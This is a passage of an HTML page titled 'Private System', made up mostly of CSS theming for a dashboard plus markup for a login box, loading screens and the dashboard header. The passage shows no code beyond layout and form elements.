<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* CSS Variables for Theming */
    :root {
      --dark-bg: #1a1a1a;
      --dark-text: #f9f2dc;
      --dark-box-bg: #2a2a2a;
      --dark-box-shadow: rgba(255, 145, 77, 0.3);
      --dark-header-bg: #ff914d;
      --dark-header-text: #000;
      --dark-btn-bg: #ff914d;
      --dark-btn-hover: #ffb67a;
      --dark-accent-color: #ff914d; /* Dynamic via settings */
      --dark-panic-btn-bg: #ff4c4c;
      --dark-input-bg: #1c1c1c;
      --dark-input-text: white;
      --dark-error-text: red;
      --dark-calendar-bg: #333;
      --dark-update-entry-bg: #40210f;
      --dark-update-entry-text: #ffccb3;
      --dark-info-panel-bg: #2a2a2a;
      --dark-info-panel-title: var(--dark-accent-color);
      --dark-wifi-entry-bg: #40210f;
      --dark-calculator-bg-output: #444;
      --dark-calculator-op-btn: #ffaa00;
      --dark-calculator-eq-btn: var(--dark-accent-color);
      --dark-switch-bg-off: #ccc;


      --light-bg: #f9f2dc;
      --light-text: #1a1a1a;
      --light-box-bg: #ffd966;
      --light-box-shadow: rgba(255, 145, 77, 0.6);
      --light-header-bg: #994d00;
      --light-header-text: #f9f2dc;
      --light-btn-bg: #994d00;
      --light-btn-hover: #b36b00;
      --light-accent-color: #994d00; /* Dynamic via settings */
      --light-panic-btn-bg: #cc3939;
      --light-input-bg: #eee;
      --light-input-text: #333;
      --light-error-text: #cc0000;
      --light-calendar-bg: #ffd966;
      --light-update-entry-bg: #ffd999;
      --light-update-entry-text: #994d00;
      --light-info-panel-bg: #ffd966;
      --light-info-panel-title: var(--light-accent-color);
      --light-wifi-entry-bg: #ffd999;
      --light-calculator-bg-output: #ccc;
      --light-calculator-op-btn: #ffa000;
      --light-calculator-eq-btn: var(--light-accent-color);
      --light-switch-bg-off: #999;

      /* Base font size, configurable from settings */
      --base-font-size: 16px;
    }

    body.dark-theme {
      background-color: var(--dark-bg);
      color: var(--dark-text);
      font-size: var(--base-font-size);
    }

    body.light-theme {
      background-color: var(--light-bg);
      color: var(--light-text);
      font-size: var(--base-font-size);
    }

    /* Transitions for smooth theme changes */
    .login-body, .dashboard-body {
      transition: background-color 0.5s ease, color 0.5s ease, font-size 0.3s ease;
    }

    /* Loading Screen Styles */
    .loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      font-size: 2.5em;
      font-family: 'Courier New', monospace;
      z-index: 9999;
      opacity: 0;
      visibility: hidden;
      transition: opacity 1s ease, visibility 1s ease;
    }

    .loading-screen.active {
      opacity: 1;
      visibility: visible;
    }

    .loading-text {
      border-right: .15em solid orange;
      white-space: nowrap;
      overflow: hidden;
      margin: 0 auto;
      transform: scale(0.8);
      opacity: 0;
    }

    .loading-screen.active .loading-text {
      animation: typing 2s steps(22, end) forwards,
                 blink-caret .75s step-end infinite,
                 scaleUp 1s ease-out forwards;
      animation-delay: 0.5s, 0.5s, 0.5s; /* Stagger animations */
      animation-fill-mode: forwards;
    }

    @keyframes typing {
      from { width: 0 }
      to { width: 100% }
    }

    @keyframes blink-caret {
      from, to { border-color: transparent }
      50% { border-color: orange; }
    }

    @keyframes scaleUp {
      0% { transform: scale(0.8); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }

    /* Notification Toast */
    #notificationContainer {
      position: fixed;
      bottom: 20px;
      right: 20px;
      z-index: 1000;
      max-width: 320px;
    }

    .notification-toast {
      background-color: var(--dark-accent-color);
      color: var(--dark-header-text);
      padding: 10px 15px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
      margin-top: 10px;
      opacity: 0;
      transform: translateY(100%);
      transition: opacity 0.5s ease-out, transform 0.5s ease-out;
      font-size: 0.9em;
      cursor: pointer;
      position: relative; /* For the fade-out effect */
    }

    .notification-toast.show {
      opacity: 1;
      transform: translateY(0);
    }

    .dashboard-body.light-theme .notification-toast {
      background-color: var(--light-accent-color);
      color: var(--light-header-text);
    }

    /* Login System Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body.login-body {
      margin: 0; padding: 0;
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      opacity: 0; /* Hidden initially for pre-load anim */
      visibility: hidden;
      transition: opacity 1s ease, visibility 1s ease;
    }

    body.login-body.active {
      opacity: 1;
      visibility: visible;
    }

    .login-box {
      background: var(--dark-box-bg);
      border-radius: 20px;
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 360px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, background-color 0.3s, color 0.3s;
    }

    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }

    @keyframes flashRed {
      0%, 100% { border-color: var(--dark-error-text); box-shadow: 0 0 15px var(--dark-error-text); }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }

    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
      color: inherit;
    }

    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: var(--dark-input-bg);
      border: none;
      color: var(--dark-input-text);
      border-radius: 8px;
      font-size: 1em;
      transition: background-color 0.3s, color 0.3s;
    }

    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
      color: inherit;
    }

    #showPassword:checked + span {
      color: var(--dark-error-text);
    }

    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: var(--dark-error-text); /* Red for login button specifically */
      color: white;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.2s, box-shadow 0.2s;
    }

    .login-box button:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(255, 0, 0, 0.4);
    }

    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: var(--dark-error-text);
    }

    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
      color: white;
    }

    .popup input {
      margin-bottom: 15px;
    }

    /* Dashboard Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap');

    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      padding: 20px;
      zoom: 1; /* Retain zoom capability */
      min-height: 100vh;
      display: none; /* Hidden by default */
    }

    body.dashboard-body.light-theme {
      background-color: var(--light-bg);
      color: var(--light-text);
    }
    body.dashboard-body.dark-theme {
      background-color: var(--dark-bg);
      color: var(--dark-text);
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--dark-header-bg);
      padding: 15px 25px;
      border-radius: 12px;
      color: var(--dark-header-text);
      margin-bottom: 20px;
      transition: background-color 0.3s, color 0.3s;
    }

    .dashboard-body.light-theme .dashboard-header {
      background: var(--light-header-bg);
      color: var(--light-header-text);
    }

    .dashboard-header h1 {
      font-size: 24px;
      color: inherit;
    }

    .user-info {
      font-weight: bold;
      color: inherit;
    }

    .version-box {
      background: #ffd966; /* Fixed color */
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
    }

    .quick-bar, .utility-buttons-row {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px;
      flex-wrap: wrap;
      margin-top: 20px;
    }

    .quick-bar button, .utility-buttons-row button, .info-panel button, .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button {
      background-color: var(--dark-btn-bg);
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.2s, box-shadow 0.2s;
      min-width: 110px;
      white-space: nowrap;
      text-decoration: none;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .dashboard-body.light-theme .quick-bar button, .dashboard-body.light-theme .utility-buttons-row button, .dashboard-body.light-theme .info-panel button, .dashboard-body.light-theme .handbook-buttons a, .dashboard-body.light-theme .links-list a, .dashboard-body.light-theme .exploit-buttons a, .dashboard-body.light-theme .bypass-buttons button {
      background-color: var(--light-btn-bg);
      color: var(--light-header-text);
    }


    .quick-bar button:hover, .utility-buttons-row button:hover, .info-panel button:hover, .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
      background-color: var(--dark-btn-hover);
      transform: translateY(-2px);
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }

    .dashboard-body.light-theme .quick-bar button:hover, .dashboard-body.light-theme .utility-buttons-row button:hover, .dashboard-body.light-theme .info-panel button:hover, .dashboard-body.light-theme .handbook-buttons a:hover, .dashboard-body.light-theme .links-list a:hover, .dashboard-body.light-theme .exploit-buttons a:hover, .dashboard-body.light-theme .bypass-buttons button:hover {
      background-color: var(--light-btn-hover);
    }

    #panicBtn {
      background: var(--dark-panic-btn-bg) !important;
      color: white !important;
    }
    .dashboard-body.light-theme #panicBtn {
      background: var(--light-panic-btn-bg) !important;
      color: white !important;
    }

    .announcement-bar {
      width: 100%;
      background-color: var(--dark-btn-bg);
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
      transition: background-color 0.3s, color 0.3s;
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    body.dashboard-body.light-theme .announcement-bar {
      background-color: var(--light-box-bg);
      color: var(--light-text);
    }

    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    .box {
      background-color: var(--dark-box-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px var(--dark-box-shadow);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s;
      flex: 1 1 300px;
      color: inherit;
    }

    body.dashboard-body.light-theme .box {
      background-color: var(--light-box-bg);
      color: var(--light-text);
      box-shadow: 0 0 15px var(--light-box-shadow);
    }

    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: var(--dark-accent-color);
      transition: color 0.3s;
    }

    body.dashboard-body.light-theme .box h2 {
      color: var(--light-accent-color);
    }

    .box p, .box ul {
      font-size: 14px;
    }

    .update-entry {
      background: var(--dark-update-entry-bg);
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: var(--dark-update-entry-text);
      transition: background-color 0.3s, color 0.3s;
    }

    body.dashboard-body.light-theme .update-entry {
      background: var(--light-update-entry-bg);
      color: var(--light-update-entry-text);
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: var(--dark-calendar-bg);
      border-radius: 4px;
      transition: background-color 0.3s, color 0.3s;
    }

    .today {
      background: var(--dark-accent-color) !important;
      font-weight: bold;
      color: black;
    }

    body.dashboard-body.light-theme .calendar div {
      background: var(--light-box-bg);
      color: var(--light-text);
    }

    body.dashboard-body.light-theme .today {
      background: var(--light-accent-color) !important;
      color: var(--light-text);
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      flex: 1 1 100%;
    }

    #notesCanvas {
      border: 2px solid var(--dark-accent-color);
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
    }

    body.dashboard-body.light-theme #notesCanvas {
      border: 2px solid var(--light-accent-color);
    }

    #canvasControls {
      margin-top: 10px;
    }

    #canvasControls button {
      background-color: var(--dark-btn-bg);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s;
      margin: 0 5px;
    }

    #canvasControls button:hover {
      background-color: var(--dark-btn-hover);
    }
    body.dashboard-body.light-theme #canvasControls button {
      background-color: var(--light-btn-bg);
      color: var(--light-header-text);
    }
    body.dashboard-body.light-theme #canvasControls button:hover {
      background-color: var(--light-btn-hover);
    }


    .motivation-box {
      background-color: var(--dark-calendar-bg);
      color: var(--dark-update-entry-text);
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px var(--dark-box-shadow);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s;
    }

    body.dashboard-body.light-theme .motivation-box {
      background-color: var(--light-box-bg);
      color: var(--light-text);
      box-shadow: 0 0 12px var(--light-box-shadow);
    }

    /* Info Panel Styles */
    .info-panel, #settingsPanel, #addReminderModal {
      display: none;
      background-color: var(--dark-info-panel-bg);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px var(--dark-box-shadow);
      color: inherit;
      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s;
      opacity: 0;
      transform: translateY(20px);
    }

    .info-panel.show, #settingsPanel.show, #addReminderModal.show {
      opacity: 1;
      transform: translateY(0);
      transition: opacity 0.5s ease-out, transform 0.5s ease-out;
      display: block;
    }

    body.dashboard-body.light-theme .info-panel, body.dashboard-body.light-theme #settingsPanel, body.dashboard-body.light-theme #addReminderModal {
      background-color: var(--light-info-panel-bg);
      color: var(--light-text);
      box-shadow: 0 0 15px var(--light-box-shadow);
    }

    .info-panel h2, #settingsPanel h2, #addReminderModal h2 {
      color: var(--dark-info-panel-title);
      margin-bottom: 15px;
      transition: color 0.3s;
    }
    body.dashboard-body.light-theme .info-panel h2, body.dashboard-body.light-theme #settingsPanel h2, body.dashboard-body.light-theme #addReminderModal h2 {
      color: var(--light-info-panel-title);
    }

    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 8px;
      background: var(--dark-calendar-bg);
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      transition: background-color 0.3s;
    }

    body.dashboard-body.light-theme .wifi-grid div {
      background: var(--light-box-bg);
    }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: var(--dark-wifi-entry-bg);
      border-radius: 6px;
      text-align: center;
      transition: background-color 0.3s;
    }

    body.dashboard-body.light-theme .wifi-entry div {
      background: var(--light-wifi-entry-bg);
    }

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .coming-soon {
      background: var(--dark-wifi-entry-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      transition: background-color 0.3s;
    }

    body.dashboard-body.light-theme .coming-soon {
      background: var(--light-wifi-entry-bg);
    }

    .info-text {
      background: var(--dark-wifi-entry-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      transition: background-color 0.3s;
    }

    body.dashboard-body.light-theme .info-text {
      background: var(--light-wifi-entry-bg);
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .school-info-item {
      background: var(--dark-wifi-entry-bg);
      padding: 12px;
      border-radius: 8px;
      transition: background-color 0.3s;
    }

    body.dashboard-body.light-theme .school-info-item {
      background: var(--light-wifi-entry-bg);
    }

    .school-info-label {
      font-weight: bold;
      color: var(--dark-info-panel-title);
      margin-bottom: 5px;
      transition: color 0.3s;
    }

    body.dashboard-body.light-theme .school-info-label {
      color: var(--light-info-panel-title);
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .ipad-options button {
      flex: 1;
    }

    .ipad-content, .bypass-content {
      display: none;
      background: var(--dark-wifi-entry-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      transition: background-color 0.3s;
    }

    body.dashboard-body.light-theme .ipad-content, body.dashboard-body.light-theme .bypass-content {
      background: var(--light-wifi-entry-bg);
    }
    .small-inline-btn { /* For buttons inside text content */
        background-color: var(--dark-accent-color);
        color: black;
        border: none;
        padding: 4px 8px;
        border-radius: 5px;
        font-size: 0.8em;
        cursor: pointer;
        transition: background-color 0.2s;
        min-width: unset;
        display: inline-flex;
        align-items: center;
        margin: 0 5px;
    }
    .dashboard-body.light-theme .small-inline-btn {
        background-color: var(--light-accent-color);
        color: white;
    }
    .small-inline-btn:hover {
        filter: brightness(1.1);
        transform: translateY(-1px);
    }

    /* Settings Panel Specific Styles */
    #settingsPanel {
      max-width: 900px;
      margin-left: auto;
      margin-right: auto;
    }
    .settings-section {
      margin-bottom: 25px;
      padding-bottom: 15px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }
    body.light-theme .settings-section {
      border-color: rgba(0, 0, 0, 0.1);
    }
    .settings-section:last-child {
      border-bottom: none;
    }
    .settings-section h3 {
      color: var(--dark-info-panel-title);
      margin-top: 0;
      margin-bottom: 15px;
      font-size: 1.3em;
    }
    body.light-theme .settings-section h3 {
      color: var(--light-info-panel-title);
    }
    .settings-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 0;
      border-bottom: 1px dotted rgba(255, 255, 255, 0.05);
    }
    body.light-theme .settings-item {
      border-color: rgba(0, 0, 0, 0.05);
    }
    .settings-item:last-child {
      border-bottom: none;
    }
    .settings-item label {
      flex-grow: 1;
      font-size: 1em;
    }
    .settings-item select, .settings-item input[type="text"], .settings-item input[type="number"], .settings-item input[type="color"] {
      padding: 6px 10px;
      border-radius: 5px;
      border: 1px solid #555;
      background: #333;
      color: white;
      margin-left: 15px;
      flex-shrink: 0; /* Prevent input/select from shrinking */
    }
    body.light-theme .settings-item select, body.light-theme .settings-item input[type="text"], body.light-theme .settings-item input[type="number"], body.light-theme .settings-item input[type="color"] {
      border-color: #aaa;
      background: #f0f0f0;
      color: #333;
    }
    .settings-item button {
      padding: 8px 15px;
      margin-left: 10px;
      border-radius: 5px;
      cursor: pointer;
      font-weight: normal;
    }
    /* Specifically target number input in settings for size adjustment */
    .settings-item input[type="range"] {
        flex-grow: 1;
        margin: 0 10px;
        -webkit-appearance: none;
        width: auto; /* Allow flexible width */
        height: 8px;
        background: #d3d3d3;
        outline: none;
        opacity: 0.7;
        transition: opacity .2s;
        border-radius: 5px;
    }
    .settings-item input[type="range"]:hover {
        opacity: 1;
    }
    .settings-item input[type="range"]::-webkit-slider-thumb {
        -webkit-appearance: none;
        appearance: none;
        width: 18px;
        height: 18px;
        border-radius: 50%;
        background: var(--dark-accent-color);
        cursor: pointer;
    }
    .dashboard-body.light-theme .settings-item input[type="range"]::-webkit-slider-thumb {
        background: var(--light-accent-color);
    }
    .settings-item input[type="range"]::-moz-range-thumb {
        width: 18px;
        height: 18px;
        border-radius: 50%;
        background: var(--dark-accent-color);
        cursor: pointer;
    }
    .dashboard-body.light-theme .settings-item input[type="range"]::-moz-range-thumb {
        background: var(--light-accent-color);
    }
    /* To ensure specific width on specific inputs in settings if needed */
    .settings-item .font-size-value {
        min-width: 50px; /* Adjust as necessary */
        text-align: right;
    }


    /* Toggle Switch */
    .switch {
      position: relative;
      display: inline-block;
      width: 40px;
      height: 24px;
      margin-left: 15px;
      flex-shrink: 0; /* Prevent switch from shrinking */
    }

    .switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }

    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: var(--dark-switch-bg-off);
      transition: .4s;
      border-radius: 24px;
    }
    .dashboard-body.light-theme .slider {
        background-color: var(--light-switch-bg-off);
    }

    .slider:before {
      position: absolute;
      content: "";
      height: 16px;
      width: 16px;
      left: 4px;
      bottom: 4px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }

    input:checked + .slider {
      background-color: var(--dark-accent-color);
    }
    body.light-theme input:checked + .slider {
      background-color: var(--light-accent-color);
    }

    input:focus + .slider {
      box-shadow: 0 0 1px var(--dark-accent-color);
    }
    body.light-theme input:focus + .slider {
        box-shadow: 0 0 1px var(--light-accent-color);
    }


    input:checked + .slider:before {
      transform: translateX(16px);
    }

    /* Reminder Modal styles */
    .modal-overlay {
        display: none; /* Hidden by default */
        position: fixed; /* Stay in place */
        z-index: 2000; /* Sit on top */
        left: 0;
        top: 0;
        width: 100%; /* Full width */
        height: 100%; /* Full height */
        overflow: auto; /* Enable scroll if needed */
        background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
        animation: fadeIn 0.3s forwards;
    }

    .modal-content {
        background-color: var(--dark-info-panel-bg);
        margin: 10% auto; /* Adjust to 10% from top for more room */
        padding: 30px;
        border: 1px solid #888;
        border-radius: 12px;
        width: 80%; /* Could be more or less, depending on screen size */
        max-width: 500px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        position: relative;
        animation: slideInFromTop 0.4s forwards;
    }
    body.light-theme .modal-content {
      background-color: var(--light-info-panel-bg);
    }

    .close-button {
        color: #aaa;
        float: right;
        font-size: 28px;
        font-weight: bold;
        position: absolute;
        right: 20px;
        top: 10px;
    }

    .close-button:hover,
    .close-button:focus {
        color: black;
        text-decoration: none;
        cursor: pointer;
    }

    .modal-content label { /* Styling for labels inside modal */
        display: block;
        text-align: left;
        margin-bottom: 5px;
        font-weight: bold;
    }

    .modal-content input[type="text"],
    .modal-content input[type="date"],
    .modal-content input[type="time"],
    .modal-content textarea {
        width: calc(100% - 20px);
        padding: 10px;
        margin-bottom: 15px;
        border-radius: 8px;
        border: 1px solid #555;
        background: #333;
        color: white;
        font-size: 1em;
        resize: vertical;
    }
    body.light-theme .modal-content input, body.light-theme .modal-content textarea {
      border: 1px solid #aaa;
      background: #f0f0f0;
      color: #333;
    }

    .modal-content button {
        background-color: var(--dark-accent-color);
        color: black;
        border: none;
        padding: 10px 20px;
        border-radius: 8px;
        cursor: pointer;
        font-size: 1em;
    }
    body.light-theme .modal-content button {
      background-color: var(--light-accent-color);
      color: white;
    }

    @keyframes fadeIn {
        from {opacity: 0;}
        to {opacity: 1;}
    }

    @keyframes slideInFromTop {
        from {transform: translateY(-50px); opacity: 0;}
        to {transform: translateY(0); opacity: 1;}
    }

    /* Calculator & Password Generator */
    .calculator-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      grid-gap: 10px;
      margin-top: 15px;
    }
    .calculator-output {
      grid-column: 1 / -1;
      background-color: var(--dark-calculator-bg-output);
      color: white;
      padding: 15px;
      text-align: right;
      border-radius: 8px;
      font-size: 1.8em;
      min-height: 50px;
      display: flex;
      align-items: flex-end;
      justify-content: flex-end;
      word-break: break-all;
    }
    .dashboard-body.light-theme .calculator-output {
        background-color: var(--light-calculator-bg-output);
        color: #333;
    }

    .calculator-grid button {
      width: auto; /* Override min-width */
      padding: 15px 0;
      font-size: 1.2em;
    }
    .calculator-grid button.span-2 {
      grid-column: span 2;
    }
    .calculator-grid button.operator {
      background-color: var(--dark-calculator-op-btn);
    }
    .dashboard-body.light-theme .calculator-grid button.operator {
        background-color: var(--light-calculator-op-btn);
    }
    .calculator-grid button.equal {
      background-color: var(--dark-calculator-eq-btn);
      color: black;
    }
    .dashboard-body.light-theme .calculator-grid button.equal {
        background-color: var(--light-calculator-eq-btn);
        color: white;
    }


    #passwordGeneratorResult {
      background: var(--dark-wifi-entry-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      font-family: 'Courier New', monospace;
      font-size: 1.1em;
      word-wrap: break-word;
      min-height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    body.light-theme #passwordGeneratorResult {
        background: var(--light-wifi-entry-bg);
    }
    #passwordGeneratorControls {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-top: 15px;
    }
    #passwordGeneratorControls div {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    #passwordGeneratorControls input[type="range"] {
      flex-grow: 1;
      margin: 0 10px;
      -webkit-appearance: none;
      width: 100%;
      height: 8px;
      background: #d3d3d3;
      outline: none;
      opacity: 0.7;
      transition: opacity .2s;
      border-radius: 5px;
    }
    #passwordGeneratorControls input[type="range"]:hover {
      opacity: 1;
    }
    #passwordGeneratorControls input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: var(--dark-accent-color);
      cursor: pointer;
    }
    body.light-theme #passwordGeneratorControls input[type="range"]::-webkit-slider-thumb {
        background: var(--light-accent-color);
    }
    #passwordGeneratorControls input[type="range"]::-moz-range-thumb {
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: var(--dark-accent-color);
      cursor: pointer;
    }
    body.light-theme #passwordGeneratorControls input[type="range"]::-moz-range-thumb {
        background: var(--light-accent-color);
    }
    #passwordGeneratorControls label {
      white-space: nowrap;
    }
    #passwordGeneratorControls button {
      margin-top: 10px;
    }
    .password-settings-grid {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 10px;
    }
    .password-settings-item {
        display: flex;
        align-items: center;
        gap: 10px;
    }

    /* To-Do List Panel */
    #activeRemindersList, #completedRemindersList {
        list-style: none;
        padding: 0;
        margin-top: 15px;
    }
    #activeRemindersList li, #completedRemindersList li {
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        align-items: flex-start;
        background: var(--dark-wifi-entry-bg);
        padding: 10px;
        margin-bottom: 8px;
        border-radius: 6px;
        transition: background-color 0.3s;
        border-left: 5px solid transparent;
    }
    #activeRemindersList li.overdue {
        border-left-color: #ff4c4c; /* Red for overdue */
    }
    #activeRemindersList li.upcoming {
        border-left-color: #ffd966; /* Orange for upcoming */
    }
    #completedRemindersList li {
        text-decoration: line-through;
        opacity: 0.7;
        border-left-color: #28a745; /* Green for completed */
    }
    body.light-theme #activeRemindersList li, body.light-theme #completedRemindersList li {
        background: var(--light-wifi-entry-bg);
    }

    .reminder-title-date {
        font-weight: bold;
        display: block;
        margin-bottom: 5px;
    }
    .reminder-description {
        font-size: 0.9em;
        margin-bottom: 10px;
    }
    .reminder-controls {
        display: flex;
        gap: 8px;
        align-self: flex-end; /* Align buttons to the right */
        margin-top: 5px;
    }
    #remindersPanel .reminder-controls button { /* General button style applied */
        min-width: unset;
        padding: 6px 12px;
        font-size: 0.85em;
    }

    /* Unit Converter */
    .unit-converter-grid {
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 15px;
        margin-top: 15px;
    }
    .unit-converter-input-group {
        display: flex;
        flex-direction: column;
        gap: 8px;
    }
    .unit-converter-input-group select, .unit-converter-input-group input {
        width: 100%;
        padding: 8px 10px;
        border-radius: 5px;
        border: 1px solid #555;
        background: #333;
        color: white;
        font-size: 1em;
    }
    body.light-theme .unit-converter-input-group select, body.light-theme .unit-converter-input-group input {
      border: 1px solid #aaa;
      background: #f0f0f0;
      color: #333;
    }
    .unit-converter-result {
        grid-column: 1 / -1;
        background: var(--dark-wifi-entry-bg);
        padding: 15px;
        border-radius: 8px;
        margin-top: 10px;
        text-align: center;
        font-weight: bold;
        min-height: 40px;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    body.light-theme .unit-converter-result {
      background: var(--light-wifi-entry-bg);
    }


  </style>

  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>

</head>
<body class="login-body dark-theme" id="bodyElement">

  <!-- Initial Loading Screen -->
  <div class="loading-screen active" id="initialLoadingScreen">
    <div class="loading-text">Initializing System...</div>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>
    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard Loading Screen -->
  <div class="loading-screen" id="dashboardLoadingScreen">
    <div class="loading-text">Loading Dashboard...</div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 2.0.0 (Enhanced)</div>
    </div>

    <div class="quick-bar">
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
